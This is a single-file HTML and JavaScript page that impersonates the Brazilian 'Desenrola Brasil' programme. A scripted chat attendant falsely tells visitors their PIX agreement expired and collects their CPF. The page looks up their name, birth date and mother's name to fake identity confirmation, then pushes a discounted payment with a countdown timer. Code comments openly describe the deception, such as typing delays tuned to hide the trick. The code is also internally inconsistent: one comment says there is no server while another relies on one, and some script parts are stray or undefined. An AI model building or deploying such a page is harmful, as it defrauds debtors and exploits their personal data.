<!doctype html>
<html lang="pt-BR">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="theme-color" content="#1b34b8">
<meta name="robots" content="noindex, nofollow">
<title>Reativar meu acordo · Desenrola Brasil</title>

<!-- =========================================================================
     PÁGINA DE REATIVAÇÃO DE ACORDO — arquivo único, sem servidor.

     Não há build, dependência ou API: é só subir este arquivo.
     Tudo que precisa ser ajustado está no bloco CONFIG, no fim da página.
     ========================================================================= -->

<style>
  :root {
    --gov-50:#eef2ff; --gov-100:#dce4ff; --gov-500:#2a45cf;
    --gov-600:#1b34b8; --gov-700:#142a99; --gov-900:#0d1b5e;
    --ok-50:#ecfdf5; --ok-500:#059669; --ok-600:#047857;
    --tela:#f1f3f9; --tinta:#14213d;
    --sans: ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
  }

  * { box-sizing: border-box; margin: 0; padding: 0; }
  html { -webkit-text-size-adjust: 100%; }

  body {
    min-height: 100dvh;
    background: var(--tela);
    color: var(--tinta);
    font-family: var(--sans);
    -webkit-font-smoothing: antialiased;
    overscroll-behavior-y: none;
    padding-bottom: env(safe-area-inset-bottom);
    -webkit-tap-highlight-color: transparent;
  }

  main {
    margin: 0 auto;
    display: flex;
    flex-direction: column;
    min-height: 100dvh;
    width: 100%;
    max-width: 36rem;
    background: var(--tela);
  }
  @media (min-width: 640px) {
    main { box-shadow: 0 20px 25px -5px rgb(0 0 0 / .1); outline: 1px solid rgb(0 0 0 / .05); }
  }

  /* ---- cabeçalho ---- */
  header {
    position: sticky; top: 0; z-index: 10;
    background: rgb(255 255 255 / .95);
    backdrop-filter: blur(8px);
    border-bottom: 1px solid rgb(0 0 0 / .05);
  }
  .faixa-gov { height: 4px; background: var(--gov-600); }
  .topo { display: flex; align-items: center; gap: 12px; padding: 12px 16px; }
  .topo-nome { font-size: 15px; font-weight: 700; line-height: 1.2; }
  .topo-cargo { font-size: 12px; color: rgb(20 33 61 / .55); }
  .online {
    margin-left: auto; display: inline-flex; align-items: center; gap: 6px;
    background: var(--ok-50); color: var(--ok-600);
    border-radius: 999px; padding: 4px 10px;
    font-size: 11px; font-weight: 600; white-space: nowrap;
  }
  .online::before { content:""; width:6px; height:6px; border-radius:999px; background:var(--ok-500); }

  /* ---- conversa ---- */
  .conversa {
    flex: 1;
    display: flex; flex-direction: column; gap: 14px;
    padding: 18px 12px 8px;
  }
  @media (min-width: 640px) { .conversa { padding: 20px 16px 8px; } }

  .avatar {
    flex-shrink: 0; border-radius: 999px; object-fit: cover;
    box-shadow: 0 0 0 2px #fff, 0 1px 2px rgb(0 0 0 / .1);
  }

  .linha { display: flex; align-items: flex-end; gap: 8px; }
  .linha-cliente { display: flex; justify-content: flex-end; }

  .bolha {
    max-width: min(560px, 85%);
    border-radius: 16px; border-bottom-left-radius: 6px;
    background: #fff; color: var(--tinta);
    padding: 12px 16px;
    font-size: 15px; line-height: 1.6;
    box-shadow: 0 1px 2px rgb(0 0 0 / .05);
    outline: 1px solid rgb(0 0 0 / .05);
  }
  .bolha strong { font-weight: 700; }
  .bolha.destaque {
    background: var(--ok-50); color: var(--ok-600);
    outline: 1px solid rgb(5 150 105 / .25);
  }
  .bolha-cliente {
    max-width: 80%;
    border-radius: 16px; border-bottom-right-radius: 6px;
    background: var(--gov-600); color: #fff;
    padding: 10px 16px;
    font-size: 15px; font-weight: 500;
    box-shadow: 0 1px 2px rgb(0 0 0 / .05);
  }

  .digitando { padding: 16px; }
  .digitando span {
    display: block; width: 6px; height: 6px; border-radius: 999px;
    background: rgb(20 33 61 / .6);
    animation: pulsar-ponto 1.2s infinite;
  }
  .pontos { display: flex; gap: 4px; }

  /* ---- cartões ---- */
  .cartao {
    border-radius: 16px; background: #fff; overflow: hidden;
    box-shadow: 0 10px 15px -3px rgb(0 0 0 / .1);
    outline: 1px solid rgb(0 0 0 / .05);
  }

  .cartao-topo { padding: 16px; border-bottom: 1px solid rgb(0 0 0 / .05); }
  @media (min-width: 640px) { .cartao-topo { padding: 16px 20px; } }

  .rotulo {
    font-size: 12px; font-weight: 600; text-transform: uppercase;
    letter-spacing: .04em; color: rgb(20 33 61 / .5);
  }

  .valores { margin-top: 12px; display: flex; flex-wrap: wrap; align-items: flex-end; gap: 8px 12px; }
  .valor-antigo {
    font-size: 18px; font-weight: 600; text-decoration: line-through;
    color: rgb(20 33 61 / .4); font-variant-numeric: tabular-nums;
  }
  .valor-novo {
    font-size: 2.1rem; font-weight: 800; line-height: 1; color: var(--ok-600);
    font-variant-numeric: tabular-nums;
  }
  @media (min-width: 640px) { .valor-novo { font-size: 2.25rem; } }
  .rotulo-menor { font-size: 13px; color: rgb(20 33 61 / .5); }
  .rotulo-ok { font-size: 13px; font-weight: 600; color: var(--ok-600); }
  .seta { flex-shrink: 0; margin-bottom: 8px; color: rgb(20 33 61 / .25); }
  .economia { margin-top: 10px; font-size: 13px; color: rgb(20 33 61 / .6); }
  .economia s { color: rgb(20 33 61 / .45); }

  .faixa-prazo {
    display: flex; align-items: center; justify-content: space-between; gap: 12px;
    background: var(--gov-50); padding: 12px 16px;
    font-size: 13px; font-weight: 500; color: var(--gov-900);
  }
  @media (min-width: 640px) { .faixa-prazo { padding: 12px 20px; } }

  .contador {
    display: inline-flex; align-items: center; gap: 6px;
    border-radius: 999px; padding: 4px 10px;
    background: var(--gov-50); color: var(--gov-700);
    font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
    font-size: 14px; font-weight: 600; font-variant-numeric: tabular-nums;
  }
  .contador.urgente { background: #fef2f2; color: #dc2626; }

  .rodape-cartao { padding: 12px 16px; font-size: 12px; color: rgb(20 33 61 / .55); }
  @media (min-width: 640px) { .rodape-cartao { padding: 12px 20px; } }

  /* ---- botões ---- */
  button, a.botao { min-height: 44px; font-family: inherit; cursor: pointer; border: 0; }

  .cta-area { padding: 16px; border-top: 1px solid rgb(0 0 0 / .05); }
  @media (min-width: 640px) { .cta-area { padding: 16px 20px; } }

  .botao-aceitar {
    display: flex; align-items: center; justify-content: center;
    width: 100%; border-radius: 14px;
    background: var(--ok-500); color: #fff;
    padding: 16px; text-align: center; text-decoration: none;
    font-size: 15px; font-weight: 700; line-height: 1.2;
    box-shadow: 0 10px 15px -3px rgb(5 150 105 / .3);
    transition: background .15s, transform .1s;
    animation: brilho 2.2s infinite;
  }
  .botao-aceitar:hover { background: var(--ok-600); }
  .botao-aceitar:active { transform: scale(.99); }
  .botao-aceitar.ocupado { animation: none; background: var(--ok-600); opacity: .85; }

  .botao-gov {
    width: 100%; border-radius: 14px;
    background: var(--gov-600); color: #fff; padding: 16px;
    font-size: 15px; font-weight: 700;
    box-shadow: 0 10px 15px -3px rgb(0 0 0 / .1);
    transition: background .15s;
  }
  .botao-gov:hover { background: var(--gov-700); }
  .botao-gov:disabled { background: rgb(0 0 0 / .15); color: rgb(0 0 0 / .4); cursor: not-allowed; }

  .aviso-cta { margin-top: 10px; text-align: center; font-size: 12px; color: rgb(20 33 61 / .5); }

  /* ---- formulário de CPF ---- */
  .form-cpf {
    border-radius: 16px; background: #fff; padding: 16px;
    box-shadow: 0 1px 2px rgb(0 0 0 / .05);
    outline: 1px solid rgb(0 0 0 / .05);
  }
  .form-cpf label { display: block; font-size: 14px; font-weight: 600; }
  .form-cpf input {
    margin-top: 10px; width: 100%;
    border-radius: 12px; border: 2px solid rgb(0 0 0 / .1); background: #fff;
    padding: 14px 16px; text-align: center;
    font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
    font-size: 20px; letter-spacing: .05em;
    color: var(--tinta); outline: none; transition: border-color .15s;
  }
  .form-cpf input:focus { border-color: var(--gov-500); }
  .form-cpf input.erro { border-color: #f87171; }
  .ajuda { margin-top: 8px; font-size: 12px; color: rgb(20 33 61 / .55); }
  .erro-texto { margin-top: 8px; font-size: 14px; font-weight: 500; color: #dc2626; }
  .form-cpf button { margin-top: 12px; }

  /* ---- cartão de conferência de identidade ---- */
  .cartao-identidade {
    border-radius: 16px; background: #fff; padding: 16px;
    box-shadow: 0 1px 2px rgb(0 0 0 / .05);
    outline: 1px solid rgb(0 0 0 / .05);
  }
  .selo-ok {
    display: flex; align-items: center; gap: 6px; margin-bottom: 12px;
    font-size: 12px; font-weight: 700; text-transform: uppercase;
    letter-spacing: .04em; color: var(--ok-600);
  }
  .cartao-identidade dl { display: flex; flex-direction: column; gap: 8px; font-size: 14px; }
  .cartao-identidade dl > div {
    display: flex; justify-content: space-between; gap: 12px;
    border-bottom: 1px solid rgb(0 0 0 / .05); padding-bottom: 8px;
  }
  .cartao-identidade dl > div:last-child { border-bottom: 0; padding-bottom: 0; }
  .cartao-identidade dt { flex-shrink: 0; color: rgb(20 33 61 / .5); }
  .cartao-identidade dd { text-align: right; font-weight: 600; overflow-wrap: anywhere; }
  .nota-identidade { margin-top: 12px; font-size: 11px; line-height: 1.5; color: rgb(20 33 61 / .45); }

  /* ---- alerta de erro ---- */
  .alerta {
    border-radius: 16px; background: #fef2f2; padding: 12px 16px;
    font-size: 14px; font-weight: 500; color: #b91c1c;
    outline: 1px solid #fecaca;
  }

  /* ---- animações ---- */
  @keyframes entrar-bolha {
    from { opacity: 0; transform: translateY(10px) scale(.98); }
    to   { opacity: 1; transform: translateY(0) scale(1); }
  }
  .entra { animation: entrar-bolha .32s cubic-bezier(.22,1,.36,1) both; }

  @keyframes pulsar-ponto {
    0%,60%,100% { opacity:.25; transform: translateY(0); }
    30% { opacity:1; transform: translateY(-3px); }
  }
  @keyframes brilho {
    0%   { box-shadow: 0 0 0 0 rgb(5 150 105 / .45); }
    70%  { box-shadow: 0 0 0 14px rgb(5 150 105 / 0); }
    100% { box-shadow: 0 0 0 0 rgb(5 150 105 / 0); }
  }

  @media (prefers-reduced-motion: reduce) {
    .entra, .digitando span, .botao-aceitar { animation: none !important; }
    html { scroll-behavior: auto; }
  }
</style>
</head>

<body>
<main>
  <header>
    <div class="faixa-gov"></div>
    <div class="topo">
      <img class="avatar" id="avatar-topo" width="42" height="42" style="width:42px;height:42px" alt="">
      <div style="min-width:0">
        <p class="topo-nome" id="topo-nome"></p>
        <p class="topo-cargo" id="topo-cargo"></p>
      </div>
      <span class="online">online</span>
    </div>
  </header>

  <section class="conversa" id="conversa"></section>
  <div id="fim" style="height:4px"></div>
</main>

/* Os valores e o nome do cliente NÃO ficam aqui: chegam de /api/consulta, que
   roda no servidor da Cloudflare. É o que mantém o token da consulta cadastral
   fora do navegador. Para ajustar os valores da campanha, edite o bloco
   CAMPANHA em functions/api/consulta.js. */

/* ===========================================================================
   Utilitários
   =========================================================================== */
const brl = (v) => v.toLocaleString("pt-BR", { style: "currency", currency: "BRL" });
const apenasDigitos = (v) => (v || "").replace(/\D+/g, "");

function mascararCpf(valor) {
  const d = apenasDigitos(valor).slice(0, 11);
  if (d.length <= 3) return d;
  if (d.length <= 6) return d.slice(0,3) + "." + d.slice(3);
  if (d.length <= 9) return d.slice(0,3) + "." + d.slice(3,6) + "." + d.slice(6);
  return d.slice(0,3) + "." + d.slice(3,6) + "." + d.slice(6,9) + "-" + d.slice(9);
}

/** 173.***.**7-28 — o titular se reconhece, mas o número não fica exposto na tela. */
function ofuscarCpf(valor) {
  const d = apenasDigitos(valor);
  if (d.length !== 11) return "";
  return d.slice(0,3) + ".***.**" + d.slice(8,9) + "-" + d.slice(9);
}

/** Confere os dois dígitos verificadores. Roda no navegador — é só uma triagem. */
function cpfValido(valor) {
  const d = apenasDigitos(valor);
  if (d.length !== 11) return false;
  if (/^(\d)\1{10}$/.test(d)) return false;

  const digito = (base, pesoInicial) => {
    let soma = 0;
    for (let i = 0; i < base.length; i++) soma += Number(base[i]) * (pesoInicial - i);
    const resto = (soma * 10) % 11;
    return resto === 10 ? 0 : resto;
  };

  return digito(d.slice(0,9), 10) === Number(d[9]) && digito(d.slice(0,10), 11) === Number(d[10]);
}

const esperar = (ms) => new Promise((r) => setTimeout(r, ms));

/* ===========================================================================
   Montagem da conversa
   =========================================================================== */
const conversa = document.getElementById("conversa");
const fim = document.getElementById("fim");

function avatar(tamanho = 34) {
  const img = document.createElement("img");
  img.className = "avatar";
  img.src = AVATAR;
  img.alt = "";
  img.width = tamanho; img.height = tamanho;
  img.style.width = tamanho + "px";
  img.style.height = tamanho + "px";
  return img;
}

function rolarAoFim() {
  fim.scrollIntoView({ behavior: "smooth", block: "end" });
}

/** Traz a proposta para o campo de visão com o topo um pouco acima do centro:
    o valor fica na altura natural do olhar e o botão sobra logo abaixo, sem
    exigir rolagem. Centralizar exato empurrava o cartão para baixo demais. */
function destacar(el) {
  const folga = Math.max(16, (window.innerHeight - el.offsetHeight) * 0.18);

  // Sem isto o cartão não sobe: sendo o último elemento da conversa, a página
  // não tem para onde rolar e ele encosta no rodapé da tela. O espaçador cria
  // o vão que falta e some junto com a rolagem.
  const espacador = document.getElementById("espacador") || document.createElement("div");
  espacador.id = "espacador";
  espacador.style.height = Math.max(0, window.innerHeight - el.offsetHeight - folga) + "px";
  el.parentNode.appendChild(espacador);

  const topoDoElemento = el.getBoundingClientRect().top + window.scrollY;
  window.scrollTo({ top: Math.max(0, topoDoElemento - folga), behavior: "smooth" });
}

function bolha(html, destaque) {
  const linha = document.createElement("div");
  linha.className = "linha entra";
  linha.appendChild(avatar());

  const balao = document.createElement("div");
  balao.className = destaque ? "bolha destaque" : "bolha";
  balao.innerHTML = html;
  linha.appendChild(balao);

  conversa.appendChild(linha);
  rolarAoFim();
  return linha;
}

function bolhaCliente(texto) {
  const linha = document.createElement("div");
  linha.className = "linha-cliente entra";

  const balao = document.createElement("div");
  balao.className = "bolha-cliente";
  balao.textContent = texto;
  linha.appendChild(balao);

  conversa.appendChild(linha);
  rolarAoFim();
  return linha;
}

function mostrarDigitando() {
  const linha = document.createElement("div");
  linha.className = "linha entra";
  linha.setAttribute("role", "status");
  linha.setAttribute("aria-label", "Digitando");
  linha.appendChild(avatar());

  const balao = document.createElement("div");
  balao.className = "bolha digitando";
  const pontos = document.createElement("span");
  pontos.className = "pontos";
  for (let i = 0; i < 3; i++) {
    const p = document.createElement("span");
    p.style.animationDelay = (i * 0.16) + "s";
    pontos.appendChild(p);
  }
  balao.appendChild(pontos);
  linha.appendChild(balao);

  conversa.appendChild(linha);
  rolarAoFim();
  return () => linha.remove();
}

/** ~45 caracteres por segundo: delay fixo entrega o truque na primeira mensagem. */
function duracaoDigitacao(caracteres) {
  return Math.min(2400, Math.max(700, 380 + caracteres * 22));
}

/** Mostra "digitando…", espera o tempo do texto e publica a fala. */
async function falar(html, opcoes = {}) {
  await esperar(opcoes.pausa ?? 550);
  const apagar = mostrarDigitando();
  await esperar(duracaoDigitacao(html.replace(/<[^>]+>/g, "").length));
  apagar();
  return bolha(html, opcoes.destaque);
}

/* ===========================================================================
   Passo 1 — abertura e pedido do CPF
   =========================================================================== */
async function abertura() {
  await falar(
    "Olá! Aqui é a <strong>" + CONFIG.atendente.split(" ")[0] + "</strong>. Recebi seu contato porque o " +
    "<strong>PIX do seu acordo expirou</strong> antes da confirmação do pagamento. 😕",
    { pausa: 350 }
  );
  await falar(
    "A boa notícia: consegui <strong>autorização para refazer sua proposta</strong> — e por um " +
    "valor ainda menor que o anterior."
  );
  await falar("Só preciso confirmar que estou falando com o titular. Pode informar seu CPF?");
  pedirCpf();
}

function pedirCpf(valorInicial) {
  const form = document.createElement("form");
  form.className = "form-cpf entra";
  form.innerHTML =
    '<label for="cpf">Digite seu CPF para confirmar sua identidade</label>' +
    '<input id="cpf" name="cpf" inputmode="numeric" autocomplete="off" enterkeyhint="go" placeholder="000.000.000-00">' +
    '<p class="ajuda" id="cpf-ajuda">Usamos seu CPF apenas para localizar a proposta enviada a você.</p>' +
    '<button type="submit" class="botao-gov" disabled>CONSULTAR MINHA PROPOSTA</button>';

  const campo = form.querySelector("input");
  const botao = form.querySelector("button");
  const ajuda = form.querySelector("#cpf-ajuda");
  let tocado = false;

  if (valorInicial) campo.value = valorInicial;

  function avaliar() {
    const d = apenasDigitos(campo.value);
    const completo = d.length === 11;
    const valido = completo && cpfValido(d);
    botao.disabled = !valido;

    const mostrarErro = tocado && completo && !valido;
    campo.classList.toggle("erro", mostrarErro);
    ajuda.className = mostrarErro ? "erro-texto" : "ajuda";
    ajuda.textContent = mostrarErro
      ? "Esse CPF não é válido. Confira os números e tente de novo."
      : "Usamos seu CPF apenas para localizar a proposta enviada a você.";
    return valido;
  }

  avaliar();
  campo.addEventListener("input", () => { campo.value = mascararCpf(campo.value); avaliar(); });
  campo.addEventListener("blur", () => { tocado = true; avaliar(); });

  form.addEventListener("submit", (e) => {
    e.preventDefault();
    tocado = true;
    if (!avaliar()) return;
    const cpf = apenasDigitos(campo.value);
    form.remove();
    consultar(cpf);
  });

  conversa.appendChild(form);
  rolarAoFim();
}

/* ===========================================================================
   Passo 2 — "consulta" e revelação da proposta
   =========================================================================== */
const ERROS = {
  CPF_INVALIDO: "Esse CPF não é válido. Confira os números e tente de novo.",
  SEM_ACORDO_ATIVO:
    "Não localizei nenhuma proposta ativa para esse CPF. Ela pode já ter sido quitada ou o prazo encerrou.",
  MUITAS_TENTATIVAS: "Muitas tentativas seguidas. Aguarde alguns minutos e tente novamente.",
  INDISPONIVEL: "Nosso sistema está instável no momento. Tente de novo em instantes.",
};

async function consultar(cpf) {
  bolhaCliente(ofuscarCpf(cpf));

  await esperar(400);
  bolha("Perfeito, consultando sua proposta na base do programa…");
  const apagar = mostrarDigitando();

  let dados;
  try {
    const resposta = await fetch("/api/consulta", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ cpf: cpf }),
    });
    dados = await resposta.json();

    if (!resposta.ok) {
      apagar();
      await falhar(ERROS[dados && dados.erro] || ERROS.INDISPONIVEL, cpf);
      return;
    }
  } catch (e) {
    apagar();
    await falhar(ERROS.INDISPONIVEL, cpf);
    return;
  }

  // Respiro para a "consulta" não voltar instantânea demais.
  await esperar(1200);
  apagar();

  await falar(
    "Encontrei, <strong>" + dados.primeiroNome + "</strong>! Você está " +
    flexionar(dados.sexo, "cadastrado", "cadastrada", "cadastrado(a)") +
    " no programa e seu acordo está aqui comigo. 👇",
    { pausa: 200 }
  );

  mostrarIdentidade(dados, cpf);
  await esperar(900);

  await falar(
    "Seu acordo anterior era de <strong>" + brl(dados.valorAnterior) + "</strong>, mas o prazo " +
    "de 10 minutos do PIX passou e ele foi <strong>cancelado automaticamente</strong>."
  );
  await falar(
    "Como você chegou a confirmar o acordo, solicitei uma <strong>condição especial de " +
    "reativação</strong> e ela foi aprovada. ✅",
    { destaque: true }
  );

  await esperar(400);
  mostrarProposta(dados);
}

/** Erro na consulta: mostra o aviso e devolve o campo de CPF para nova tentativa. */
async function falhar(mensagem, cpf) {
  const aviso = document.createElement("div");
  aviso.className = "alerta entra";
  aviso.setAttribute("role", "alert");
  aviso.textContent = mensagem;
  conversa.appendChild(aviso);
  rolarAoFim();

  await esperar(600);
  pedirCpf(mascararCpf(cpf));
}

/** Flexiona por sexo do cadastro; neutro quando o campo vem vazio. */
function flexionar(sexo, masculino, feminino, neutro) {
  const s = String(sexo || "").trim().toUpperCase();
  if (s === "M") return masculino;
  if (s === "F") return feminino;
  return neutro;
}

/**
 * Confere os dados sem publicá-los: nascimento e nome da mãe chegam do servidor
 * já mascarados. O titular se reconhece de imediato; quem estiver testando CPF
 * de terceiro não coleta nada aproveitável.
 */
function mostrarIdentidade(dados, cpf) {
  const linhas = [
    ["Titular", dados.nomeCompleto],
    ["CPF", ofuscarCpf(cpf)],
    ["Nascimento", dados.nascimentoMascarado],
    ["Nome da mãe", dados.nomeMaeMascarado],
  ].filter(function (l) { return l[1]; });

  const cartao = document.createElement("div");
  cartao.className = "cartao-identidade entra";
  cartao.innerHTML =
    '<p class="selo-ok">' +
      '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" ' +
      'stroke-width="3" aria-hidden="true"><path d="M20 6 9 17l-5-5" stroke-linecap="round" ' +
      'stroke-linejoin="round"/></svg> Identidade confirmada</p>' +
    '<dl>' +
      linhas.map(function (l) {
        return '<div><dt>' + l[0] + '</dt><dd>' + l[1] + '</dd></div>';
      }).join("") +
    '</dl>' +
    '<p class="nota-identidade">Exibimos seus dados parcialmente por segurança. ' +
    'Se algum deles não for seu, não prossiga e fale com a gente.</p>';

  conversa.appendChild(cartao);
  rolarAoFim();
}

function mostrarProposta(dados) {
  const temComparativo = dados.valorOriginal > dados.valorNovo;

  const cartao = document.createElement("div");
  cartao.className = "cartao entra";

  cartao.innerHTML =
    '<div class="cartao-topo">' +
      '<p class="rotulo">Nova proposta' +
        (temComparativo ? " · " + dados.percentualDesconto + "% de desconto" : "") + '</p>' +
      '<div class="valores">' +
        (temComparativo
          ? '<div><p class="rotulo-menor">Você devia</p>' +
            '<p class="valor-antigo">' + brl(dados.valorOriginal) + '</p></div>' +
            '<svg class="seta" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" ' +
            'stroke-width="2.5" aria-hidden="true"><path d="M5 12h14M13 6l6 6-6 6" stroke-linecap="round" ' +
            'stroke-linejoin="round"/></svg>'
          : "") +
        '<div><p class="rotulo-ok">Paga agora</p>' +
        '<p class="valor-novo">' + brl(dados.valorNovo) + '</p></div>' +
      '</div>' +
      (temComparativo
        ? '<p class="economia">Economia de <strong>' + brl(dados.economia) + '</strong> · acordo anterior era ' +
          '<s>' + brl(dados.valorAnterior) + '</s></p>'
        : '<p class="economia">Seu acordo anterior era <s>' + brl(dados.valorAnterior) + '</s></p>') +
    '</div>' +

    '<div class="faixa-prazo">' +
      '<span>Vale por ' + dados.minutosValidade + ' minutos</span>' +
      '<span class="contador" id="contador" role="timer">--:--</span>' +
    '</div>' +

    /* O botão vive DENTRO do cartão, colado ao valor: assim ele entra na tela
       junto com o desconto, em vez de ficar abaixo da dobra. */
    '<div class="cta-area">' +
      '<a class="botao-aceitar" id="aceitar" href="' + CONFIG.checkoutUrl + '">' +
        'ACEITAR E PAGAR ' + brl(dados.valorNovo) +
      '</a>' +
      '<p class="aviso-cta">Você será levado ao ambiente de pagamento seguro.</p>' +
    '</div>';

  conversa.appendChild(cartao);

  // O momento que importa: o cartão inteiro (valor + botão) sob os olhos.
  requestAnimationFrame(function () { destacar(cartao); });

  const botao = cartao.querySelector("#aceitar");
  botao.addEventListener("click", function () {
    botao.classList.add("ocupado");
    botao.textContent = "Abrindo pagamento seguro…";
  });

  iniciarContador(cartao.querySelector("#contador"), cartao, dados.minutosValidade);
}

/* ===========================================================================
   Passo 3 — contagem regressiva e expiração
   =========================================================================== */
function iniciarContador(elemento, cartao, minutos) {
  const alvo = Date.now() + minutos * 60000;

  const tique = () => {
    const restante = Math.max(0, alvo - Date.now());
    const minutos = String(Math.floor(restante / 60000)).padStart(2, "0");
    const segundos = String(Math.floor((restante % 60000) / 1000)).padStart(2, "0");
    elemento.textContent = minutos + ":" + segundos;
    elemento.classList.toggle("urgente", restante < 5 * 60000);

    if (restante === 0) {
      clearInterval(id);
      expirar(cartao);
    }
  };

  const id = setInterval(tique, 1000);
  tique();
}

async function expirar(cartao) {
  const espacador = document.getElementById("espacador");
  if (espacador) espacador.remove();

  cartao.querySelector(".cta-area").remove();
  cartao.querySelector(".faixa-prazo").innerHTML =
    '<span style="color:#dc2626;font-weight:600">Esta condição expirou</span>';

  await falar(
    "O tempo desta condição especial acabou. Posso verificar se ainda consigo reativar para " +
    "você — é só pedir aqui embaixo."
  );

  const botao = document.createElement("button");
  botao.className = "botao-gov entra";
  botao.textContent = "TENTAR REATIVAR MINHA PROPOSTA";
  botao.addEventListener("click", () => window.location.reload());
  conversa.appendChild(botao);
  rolarAoFim();
}

/* ===========================================================================
   Início
   =========================================================================== */
document.getElementById("topo-nome").textContent = CONFIG.atendente;
document.getElementById("topo-cargo").textContent = CONFIG.cargo;
document.getElementById("avatar-topo").src = AVATAR;

abertura();
</script>
